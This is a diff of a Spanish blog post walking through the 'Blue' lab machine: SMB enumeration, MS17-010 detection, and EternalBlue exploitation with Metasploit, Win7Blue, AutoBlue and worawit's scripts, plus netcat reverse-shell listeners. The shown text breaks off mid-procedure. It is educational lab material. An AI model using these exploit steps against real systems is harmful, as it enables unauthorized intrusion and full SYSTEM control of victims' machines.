@@ -23,14 +23,14 @@
 
 &lt;p&gt;El objetivo de este artículo es reforzar lo aprendido hasta ahora, pero también ofrecer una guía más completa, explorando distintos enfoques y metodologías que podrían ser útiles para quienes buscan profundizar más en el proceso.&lt;/p&gt;
 
-&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;
+&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase de Reconocimiento&lt;/h3&gt;
 
 &lt;p&gt;Primeramente vamos a lanzar una &lt;em&gt;traza ICMP&lt;/em&gt; para saber si la máquina está activa.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 &amp;lt;IP del host&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del &lt;em&gt;TTL&lt;/em&gt;; en este caso el valor del &lt;em&gt;TTL&lt;/em&gt; de la máquina es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt;, por lo que podemos intuir que estamos ante una máquina &lt;em&gt;Windows&lt;/em&gt;. Recordemos que algunos de los valores referenciales son los siguientes:&lt;/p&gt;
 
@@ -161,7 +161,7 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Rápidamente podemos determinar que estamos frente a un &lt;em&gt;Windows 7 Ultimate 7601 Service Pack 1&lt;/em&gt; de &lt;em&gt;64 bits&lt;/em&gt;. Además, podemos observar que el firmado del &lt;em&gt;SMB&lt;/em&gt; &lt;strong&gt;no&lt;/strong&gt; es requerido en este host. En un entorno de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Active Directory&lt;/code&gt;, esta configuración podría dar lugar a ataques como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NTLM Relay&lt;/code&gt;; sin embargo, en este escenario particular no representa un vector de ataque relevante.&lt;/p&gt;
+&lt;p&gt;Rápidamente podemos determinar que estamos frente a un &lt;em&gt;Windows 7 Ultimate 7601 Service Pack 1&lt;/em&gt; de &lt;em&gt;64 bits&lt;/em&gt;. Además, podemos observar que el firmado del &lt;em&gt;SMB&lt;/em&gt; no es requerido en este host. En un entorno de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Active Directory&lt;/code&gt;, esta configuración podría dar lugar a ataques como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NTLM Relay&lt;/code&gt;; sin embargo, en este escenario particular no representa un vector de ataque relevante.&lt;/p&gt;
 
 &lt;p&gt;En cuanto a los dialectos soportados, podemos ver que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBv1&lt;/code&gt; se encuentra habilitado, por lo que el host podría ser vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;, siempre que el sistema no haya sido debidamente parcheado.&lt;/p&gt;
 
@@ -174,13 +174,13 @@
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; smb-protocols,smb2-security-mode,smb-security-mode,smb-os-discovery &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 139,445 &amp;lt;IP del host&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Similar a los resultados obtenidos con &lt;em&gt;NetExec&lt;/em&gt;, este escaneo con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt; nos proporciona información sobre los protocolos soportados, la configuración de seguridad de &lt;em&gt;SMB&lt;/em&gt;, y la versión del sistema operativo.&lt;/p&gt;
-
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Los resultados son consistentes con los obtenidos previamente con &lt;em&gt;NetExec&lt;/em&gt;, permitiéndonos validar los hallazgos mediante una segunda herramienta.&lt;/p&gt;
 
 &lt;h5 id=&quot;metasploit&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Metasploit&lt;/h5&gt;
 
-&lt;p&gt;Finalmente, como alternativa, podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; para realizar la enumeración del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt;. El módulo auxiliar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb_version&lt;/code&gt; nos permitirá listar los dialectos soportados y el estado del firmado &lt;em&gt;SMB&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;Finalmente, como alternativa, podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; para enumerar el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; mediante el módulo auxiliar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb_version&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
 use auxiliary/scanner/smb/smb_version
@@ -190,35 +190,35 @@ run
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Una vez ejecutado, podemos confirmar nuevamente los dialectos soportados por el servidor, el dialecto preferido, la configuración del firmado &lt;em&gt;SMB&lt;/em&gt;, y la versión del sistema operativo.&lt;/p&gt;
+&lt;p&gt;Una vez ejecutado, podemos corroborar los hallazgos previamente identificados, reforzando la consistencia del análisis.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;h4 id=&quot;smb-shares&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;SMB Shares&lt;/h4&gt;
 
-&lt;p&gt;Con todo esta información en mente, podemos profundizar aún más en el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt;. Dado que las &lt;em&gt;null sessions&lt;/em&gt; están habilitadas, podemos establecer una sesión anónima contra el servidor e intentar enumerar recursos compartidos a nivel de red; y en caso de que los permisos lo permitan, también podríamos interactuar con dichos recursos. Para esta tarea utilizaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;Con toda esta información en mente, podemos profundizar aún más en el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt;. Dado que las &lt;em&gt;null sessions&lt;/em&gt; están habilitadas, podemos establecer una sesión anónima contra el servidor e intentar enumerar recursos compartidos a nivel de red y, en caso de que los permisos lo permitan, interactuar con ellos. Para esta tarea utilizaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt;:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;IP del host&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;En este caso, únicamente podemos listar los recursos existentes, pues no contamos con permisos suficientes para interactuar con ellos, ya que el acceso está restringido.&lt;/p&gt;
+&lt;p&gt;En este caso, únicamente podemos listar los recursos existentes, ya que no contamos con permisos suficientes para interactuar con ellos.&lt;/p&gt;
 
 &lt;h4 id=&quot;eternalblue&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;EternalBlue&lt;/h4&gt;
 
-&lt;p&gt;Esto nos deja con un último vector potencial a evaluar: determinar si la implementación de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBv1&lt;/code&gt; presente en el sistema se encuentra sin parchear y, por lo tanto, es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;. Para verificar la presencia de esta vulnerabilidad, utilizaremos dos enfoques distintos.&lt;/p&gt;
+&lt;p&gt;Esto nos deja con un último vector potencial a evaluar: determinar si la implementación de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBv1&lt;/code&gt; presente en el sistema se encuentra sin parchear y, por lo tanto, es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;). Para verificar la presencia de esta vulnerabilidad, utilizaremos dos herramientas distintas.&lt;/p&gt;
 
 &lt;h5 id=&quot;nmap-1&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Nmap&lt;/h5&gt;
 
-&lt;p&gt;Podemos continuar utilizando scripts de descubrimiento de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt;, esta vez orientados a la detección de vulnerabilidades. En este caso, emplearemos el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb-vuln-ms17-010&lt;/code&gt;, para comprobar si el host es susceptible a esta vulnerabilidad:&lt;/p&gt;
+&lt;p&gt;Podemos continuar utilizando scripts de descubrimiento de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nmap&lt;/code&gt;, esta vez orientados a la detección de vulnerabilidades. En este caso, emplearemos el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb-vuln-ms17-010&lt;/code&gt; para comprobar si el host es susceptible a esta vulnerabilidad:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; smb-vuln-ms17-010 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 445 &amp;lt;IP del host&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;El resultado del escaneo confirma que el host es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, por lo que podemos explotar esta vulnerabilidad.&lt;/p&gt;
+&lt;p&gt;El resultado del escaneo indica que el host es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, lo que sugiere que la explotación podría ser viable.&lt;/p&gt;
 
 &lt;h5 id=&quot;metasploit-1&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Metasploit&lt;/h5&gt;
 
@@ -240,13 +240,167 @@ run
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Al igual que con &lt;em&gt;Nmap&lt;/em&gt;, confirmamos que el host es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, por lo que a explotación resulta viable.&lt;/p&gt;
+&lt;p&gt;Al igual que con &lt;em&gt;Nmap&lt;/em&gt;, confirmamos que el host es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, lo que refuerza la viabilidad de la explotación.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
+&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase de Explotación&lt;/h3&gt;
 
-&lt;p&gt;Con este mismo módulo, más adelante en caso de que quisiéramos usar herramientas automatizadas, podríamos realizar la explotación. Sin embargo, como siempre, yo discourage usar herramientas automatizadas ya que perdemos bastante el control sobre lo que está pasando por detrás, de modo que no aprendemos; sin embargo, más adelante cubriré ambas metodologías y me enfocaré mucho más en la vía manual&lt;/p&gt;
+&lt;p&gt;Una vez confirmamos que el sistema es vulnerable a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;), el siguiente paso consiste en intentar su explotación con el objetivo de obtener &lt;em&gt;ejecución remota de código&lt;/em&gt; (RCE) en la máquina víctima.&lt;/p&gt;
+
+&lt;p&gt;Antes de continuar, me gustaría comentar brevemente la metodología que seguiremos. Las herramientas automatizadas simplifican considerablemente el proceso de explotación y permiten obtener resultados de forma rápida. Sin embargo, comprender cómo y por qué funciona la vulnerabilidad nos da un mayor control sobre el proceso y nos ayuda a entender qué está ocurriendo en cada etapa.&lt;/p&gt;
+
+&lt;p&gt;Por este motivo, abordaremos ambos enfoques: por un lado, la explotación automatizada y, por otro, la explotación manual. No obstante, pondremos especial énfasis en esta última, ya que nos permite profundizar en el funcionamiento interno del fallo y desarrollar una base técnica más sólida. Este enfoque resulta especialmente útil en contextos formativos y certificaciones como la &lt;em&gt;Offensive Security Certified Professional&lt;/em&gt;, donde el uso de herramientas automatizadas se encuentra restringido.&lt;/p&gt;
+
+&lt;h4 id=&quot;explotación-automatizada&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Explotación Automatizada&lt;/h4&gt;
+
+&lt;p&gt;Para realizar la explotación automatizada utilizaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt;. En concreto, emplearemos el mismo módulo que utilizamos previamente para comprobar si el host era susceptible a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17‑010&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EternalBlue&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;La diferencia es que, en esta ocasión, en lugar de ejecutar la función &lt;em&gt;check&lt;/em&gt;, lanzaremos directamente el exploit con el objetivo de obtener &lt;em&gt;ejecución remota de código&lt;/em&gt; (RCE) sobre la máquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST &amp;lt;IP del host&amp;gt;
+exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La ejecución del módulo nos devuelve una sesión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Meterpreter&lt;/code&gt; desde la cual podemos interactuar con el sistema comprometido. Desde esta sesión es posible invocar una shell interactiva.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al verificar el contexto de ejecución, observamos que el proceso se ejecuta como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NT AUTHORITY\SYSTEM&lt;/code&gt;, es decir, con los máximos privilegios del sistema. Por tanto, no es necesario realizar ninguna escalada de privilegios adicional.&lt;/p&gt;
+
+&lt;p&gt;De esta forma, habremos explotado satisfactoriamente la vulnerabilidad y obtenido control completo sobre la máquina víctima.&lt;/p&gt;
+
+&lt;h4 id=&quot;explotación-manual&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Explotación Manual&lt;/h4&gt;
+
+&lt;p&gt;A diferencia del enfoque anterior, en esta ocasión asumiremos progresivamente un mayor grado de control sobre el proceso de explotación, trabajando directamente con distintas implementaciones de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h5 id=&quot;win7blue&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;Win7Blue&lt;/h5&gt;
+
+&lt;p&gt;La primera implementación con la que trabajaremos será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Win7Blue&lt;/code&gt;, desarrollada por el usuario &lt;a href=&quot;https://github.com/d4t4s3c&quot;&gt;d4t4s3c&lt;/a&gt;. Dado que previamente realizamos una enumeración exhaustiva del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; y determinamos la versión exacta del sistema operativo, sabemos que esta implementación, diseñada específicamente para &lt;em&gt;Windows 7&lt;/em&gt;, se ajusta a la versión que identificamos.&lt;/p&gt;
+
+&lt;p&gt;Comenzaremos clonando el repositorio:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/d4t4s3c/Win7Blue
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez clonado el proyecto, nos situamos dentro del directorio y ejecutamos el script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash Win7Blue
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Desde el menú interactivo indicaremos la arquitectura del sistema (en nuestro caso, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64 bits&lt;/code&gt;, algo que ya habíamos identificado durante la fase de enumeración), la dirección IP de la máquina víctima, nuestra dirección IP y el puerto en el que nos pondremos en escucha.&lt;/p&gt;
+
+&lt;p&gt;El propio script se encarga de generar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode&lt;/code&gt; utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSFvenom&lt;/code&gt;. Antes de lanzar la explotación, pausará la ejecución para que confirmemos que estamos en escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt;, proporcionándonos incluso el comando necesario, que ejecutaremos en una nueva terminal:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez confirmada la escucha y continuada la ejecución, el exploit se ejecutará y obtendremos una shell interactiva dentro de la máquina víctima.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;h5 id=&quot;autoblue&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;AutoBlue&lt;/h5&gt;
+
+&lt;p&gt;La segunda implementación con la que trabajaremos será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoBlue&lt;/code&gt;, desarrollada por el usuario &lt;a href=&quot;https://github.com/3ndG4me/&quot;&gt;3ndG4me&lt;/a&gt;. A diferencia de la implementación anterior, en este caso primero generaremos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode&lt;/code&gt; y posteriormente ejecutaremos el exploit.&lt;/p&gt;
+
+&lt;p&gt;Comenzaremos clonando el repositorio:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez clonado el proyecto, nos situamos dentro del directorio y accedemos a la carpeta &lt;em&gt;shellcode&lt;/em&gt;, donde ejecutaremos el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell_prep.sh&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./shell_prep.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Desde el menú interactivo seleccionaremos la opción para generar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MSFvenom&lt;/code&gt;. Indicaremos nuestra dirección IP y, dado que el script no detecta automáticamente la arquitectura del sistema objetivo, nos solicitará el puerto en el que nos pondremos en escucha tanto para &lt;em&gt;64 bits&lt;/em&gt; como para 32 bits. Asimismo, seleccionaremos la opción para generar una shell interactiva en lugar de una sesión &lt;em&gt;Meterpreter&lt;/em&gt; y especificaremos que el payload sea de tipo &lt;em&gt;stageless&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez generado el &lt;em&gt;shellcode&lt;/em&gt;, regresamos al directorio principal. Antes de ejecutar el exploit, debemos ponernos en escucha en el puerto previamente configurado, desde una nueva terminal:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con el &lt;em&gt;listener&lt;/em&gt; activo, ejecutamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eternalblue_exploit7.py&lt;/code&gt;. Dado que previamente realizamos una enumeración exhaustiva, sabemos que esta implementación se ajusta a la versión que identificamos.&lt;/p&gt;
+
+&lt;p&gt;Utilizaremos únicamente el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shellcode&lt;/code&gt; de &lt;em&gt;64 bits&lt;/em&gt;, ya que corresponde a la arquitectura que identificamos; de lo contrario, el uso de una arquitectura incompatible puede provocar fallos inesperados como reinicios o pantallazos azules (BSOD).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python eternalblue_exploit7.py &amp;lt;IP del host&amp;gt; shellcode/sc_x64.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;h5 id=&quot;ms17-010&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;MS17-010&lt;/h5&gt;
+
+&lt;p&gt;La última implementación con la que trabajaremos será la disponible en el repositorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS17-010&lt;/code&gt;, desarrollada por el usuario &lt;a href=&quot;https://github.com/worawit&quot;&gt;worawit&lt;/a&gt;. Dentro del repositorio se encuentra el script &lt;em&gt;eternalblue_exploit7.py&lt;/em&gt;, que es el que utilizan de forma subyacente las dos implementaciones anteriores. Aunque podríamos utilizarlo junto con un &lt;em&gt;shellcode&lt;/em&gt; personalizado, en esta ocasión no será el script que utilizaremos.&lt;/p&gt;
+
+&lt;p&gt;El script que emplearemos será &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zzz_exploit.py&lt;/code&gt;, que ofrece un enfoque más flexible y manual del proceso de explotación.&lt;/p&gt;
+
+&lt;p&gt;A diferencia de las implementaciones anteriores, este script no está configurado para enviar automáticamente una &lt;em&gt;reverse shell&lt;/em&gt; ni para ejecutar un payload predefinido. En su lugar, nos proporciona un mayor control sobre la sesión &lt;em&gt;SMB&lt;/em&gt; establecida, permitiéndonos modificar el comportamiento del exploit según nuestras necesidades. El código incluye secciones comentadas que pueden adaptarse para ejecutar comandos o payloads personalizados mediante la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;service_exec()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Comenzaremos clonando el repositorio:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/worawit/MS17-010
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez clonado el proyecto, nos situamos dentro del directorio. En primer lugar, ejecutaremos el script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checker.py&lt;/code&gt; para identificar los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;named pipes&lt;/code&gt; disponibles en la máquina víctima:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 checker.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://192.168.92.128:80/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
